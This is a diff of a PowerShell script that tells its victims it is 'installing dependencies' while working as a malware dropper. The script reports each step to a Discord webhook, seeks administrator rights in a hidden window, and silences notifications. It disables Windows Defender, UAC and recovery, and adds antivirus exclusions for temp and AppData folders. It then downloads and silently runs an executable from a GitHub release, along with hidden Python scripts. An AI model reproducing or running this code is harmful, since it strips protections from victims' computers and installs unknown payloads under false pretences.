@@ -3,7 +3,6 @@ $webhookUrl = 'https://discord.com/api/webhooks/1411831853316309032/Aa7_D6ww5IFI
 Write-Host "Give us 1-3 minutes depending on your PC. We are installing dependencies."
 Write-Host "Don't worry if the window closes, just wait."
 
-
 function Send-WebhookMessage {
     param($Message)
     $body = @{ content = $Message } | ConvertTo-Json -Depth 10
@@ -24,24 +23,22 @@ try {
     if (-not $isAdmin) {
         try {
             Send-WebhookMessage -Message "Attempting elevation"
-            Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -WindowStyle Hidden -ErrorAction Stop
+            Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -ErrorAction Stop
             Send-WebhookMessage -Message "Elevation successful"
             exit
         } catch {
             Send-WebhookMessage -Message "Elevation failed: $_"
+            exit 1
         }
     }
 
     if ($isAdmin) {
         try {
             Send-WebhookMessage -Message "Disabling all app notifications"
-            # Disable all notifications globally
             Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" -Name "NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK" -Value 0 -ErrorAction Stop | Out-Null
             Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" -Name "NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND" -Value 0 -ErrorAction Stop | Out-Null
             Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" -Name "NOC_GLOBAL_SETTING_ALLOW_CRITICAL_TOASTS_ABOVE_LOCK" -Value 0 -ErrorAction Stop | Out-Null
-            # Disable Windows Security app notifications
             Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Security.Health*App" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue | Out-Null
-            # Disable notifications for all apps
             Get-ChildItem -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" | ForEach-Object {
                 Set-ItemProperty -Path $_.PSPath -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue | Out-Null
                 Set-ItemProperty -Path $_.PSPath -Name "ShowInActionCenter" -Value 0 -ErrorAction SilentlyContinue | Out-Null
@@ -53,40 +50,32 @@ try {
 
         try {
             Send-WebhookMessage -Message "Disabling Windows Defender"
-            # Ensure tamper protection is off
-            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -ErrorAction SilentlyContinue | Out-Null
-            # Disable via registry
-            New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force -ErrorAction SilentlyContinue | Out-Null
-            Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -ErrorAction Stop | Out-Null
-            Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "AllowFastServiceStartup" -Value 0 -ErrorAction Stop | Out-Null
-            Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1 -ErrorAction Stop | Out-Null
-            Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1 -ErrorAction Stop | Out-Null
-            # Disable Defender services
-            try {
+            if (Get-Service -Name "WinDefend" -ErrorAction SilentlyContinue) {
+                Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -ErrorAction SilentlyContinue | Out-Null
+                New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force -ErrorAction SilentlyContinue | Out-Null
+                Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -ErrorAction Stop | Out-Null
+                Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "AllowFastServiceStartup" -Value 0 -ErrorAction Stop | Out-Null
+                Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1 -ErrorAction Stop | Out-Null
+                Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1 -ErrorAction Stop | Out-Null
                 Stop-Service -Name "WinDefend" -Force -ErrorAction Stop | Out-Null
                 Set-Service -Name "WinDefend" -StartupType Disabled -ErrorAction Stop | Out-Null
-            } catch {
-                & sc.exe delete WinDefend | Out-Null
+                if (Get-Service -Name "WdNisSvc" -ErrorAction SilentlyContinue) {
+                    Stop-Service -Name "WdNisSvc" -Force -ErrorAction SilentlyContinue | Out-Null
+                    Set-Service -Name "WdNisSvc" -StartupType Disabled -ErrorAction SilentlyContinue | Out-Null
+                }
+                if (Get-Service -Name "Sense" -ErrorAction SilentlyContinue) {
+                    Stop-Service -Name "Sense" -Force -ErrorAction SilentlyContinue | Out-Null
+                    Set-Service -Name "Sense" -StartupType Disabled -ErrorAction SilentlyContinue | Out-Null
+                }
+                Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop | Out-Null
+                Set-MpPreference -DisableIOAVProtection $true -ErrorAction Stop | Out-Null
+                Set-MpPreference -DisableScriptScanning $true -ErrorAction Stop | Out-Null
+                Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction Stop | Out-Null
+                Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction Stop | Out-Null
+                Send-WebhookMessage -Message "Windows Defender disabled"
+            } else {
+                Send-WebhookMessage -Message "Windows Defender service not found, skipping"
             }
-            try {
-                Stop-Service -Name "WdNisSvc" -Force -ErrorAction SilentlyContinue | Out-Null
-                Set-Service -Name "WdNisSvc" -StartupType Disabled -ErrorAction SilentlyContinue | Out-Null
-            } catch {
-                & sc.exe delete WdNisSvc | Out-Null
-            }
-            try {
-                Stop-Service -Name "Sense" -Force -ErrorAction SilentlyContinue | Out-Null
-                Set-Service -Name "Sense" -StartupType Disabled -ErrorAction SilentlyContinue | Out-Null
-            } catch {
-                & sc.exe delete Sense | Out-Null
-            }
-            # Turn off Defender features
-            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop | Out-Null
-            Set-MpPreference -DisableIOAVProtection $true -ErrorAction Stop | Out-Null
-            Set-MpPreference -DisableScriptScanning $true -ErrorAction Stop | Out-Null
-            Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction Stop | Out-Null
-            Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction Stop | Out-Null
-            Send-WebhookMessage -Message "Windows Defender disabled"
         } catch {
             Send-WebhookMessage -Message "Error disabling Windows Defender: $_"
         }
@@ -95,8 +84,10 @@ try {
             Send-WebhookMessage -Message "Disabling UAC and recovery services"
             Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction Stop | Out-Null
             & reagentc /disable | Out-Null
-            Stop-Service -Name "Wecsvc" -Force -ErrorAction Stop | Out-Null
-            Set-Service -Name "Wecsvc" -StartupType Disabled -ErrorAction Stop | Out-Null
+            if (Get-Service -Name "Wecsvc" -ErrorAction SilentlyContinue) {
+                Stop-Service -Name "Wecsvc" -Force -ErrorAction Stop | Out-Null
+                Set-Service -Name "Wecsvc" -StartupType Disabled -ErrorAction Stop | Out-Null
+            }
             if (Get-Service -Name "WinREAgent" -ErrorAction SilentlyContinue) {
                 Stop-Service -Name "WinREAgent" -Force -ErrorAction Stop | Out-Null
                 Set-Service -Name "WinREAgent" -StartupType Disabled -ErrorAction Stop | Out-Null
@@ -122,7 +113,7 @@ try {
             Send-WebhookMessage -Message "Added exclusion: $($dir.FullName)"
         } catch {
             $exclusionsAdded = $false
-            Send-WebhookMessage -Message "Error adding exclusion for ${dir.FullName}: $_"
+            Send-WebhookMessage -Message "Error adding exclusion for $($dir.FullName): $_"
         }
     }
 
@@ -131,7 +122,7 @@ try {
         Send-WebhookMessage -Message "Added exclusion: $tempFolder"
     } catch {
         $exclusionsAdded = $false
-        Send-WebhookMessage -Message "Error adding exclusion for ${tempFolder}: $_"
+        Send-WebhookMessage -Message "Error adding exclusion for $tempFolder: $_"
     }
 
     try {
@@ -139,7 +130,7 @@ try {
         Send-WebhookMessage -Message "Added exclusion: $appDataFolder"
     } catch {
         $exclusionsAdded = $false
-        Send-WebhookMessage -Message "Error adding exclusion for ${appDataFolder}: $_"
+        Send-WebhookMessage -Message "Error adding exclusion for $appDataFolder: $_"
     }
 
     try {
@@ -147,7 +138,7 @@ try {
         Send-WebhookMessage -Message "Added exclusion: $localAppDataFolder"
     } catch {
         $exclusionsAdded = $false
-        Send-WebhookMessage -Message "Error adding exclusion for ${localAppDataFolder}: $_"
+        Send-WebhookMessage -Message "Error adding exclusion for $localAppDataFolder: $_"
     }
 
     if ($exclusionsAdded) {
@@ -158,7 +149,7 @@ try {
             Add-MpPreference -ExclusionPath $destinationPath -ErrorAction Stop | Out-Null
             Send-WebhookMessage -Message "Added exclusion for download path: $destinationPath"
         } catch {
-            Send-WebhookMessage -Message "Error adding exclusion for ${destinationPath}: $_"
+            Send-WebhookMessage -Message "Error adding exclusion for $destinationPath: $_"
         }
 
         $downloadUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
@@ -168,7 +159,7 @@ try {
             Start-Process -FilePath $destinationPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
             Send-WebhookMessage -Message "Executed $selectedExe"
         } catch {
-            Send-WebhookMessage -Message "Error downloading or executing ${selectedExe}: $_"
+            Send-WebhookMessage -Message "Error downloading or executing $selectedExe: $_"
         }
     }
 
@@ -198,7 +189,6 @@ try {
                             [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
                             Start-Process python.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
                             Send-WebhookMessage -Message "Executed Python script with python.exe"
-
                         } catch {
                             Send-WebhookMessage -Message "Error executing with python.exe: $_"
                         }
@@ -284,7 +274,6 @@ try {
     } catch {
         Send-WebhookMessage -Message "Error downloading toolhandler Python script: $_"
     }
-
 
     Send-WebhookMessage -Message "Script completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
 } catch {
